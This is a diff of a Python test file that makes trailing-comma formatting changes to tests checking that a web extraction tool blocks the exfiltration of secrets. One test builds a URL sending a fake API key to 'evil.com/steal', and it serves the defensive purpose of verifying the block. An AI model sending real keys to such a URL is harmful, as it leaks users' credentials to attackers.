@@ -69,7 +69,7 @@ class TestWebExtractSecretExfil:
     async def test_blocks_api_key_in_url(self):
         from tools.web_tools import web_extract_tool
         result = await web_extract_tool(
-            urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
+            urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30],
         )
         parsed = json.loads(result)
         assert parsed["success"] is False
@@ -111,7 +111,7 @@ class TestWebExtractSecretExfil:
                         "title": "ok",
                         "content": "ok",
                         "raw_content": "ok",
-                    }
+                    },
                 ]
 
         async def allow_url(_url: str) -> bool:
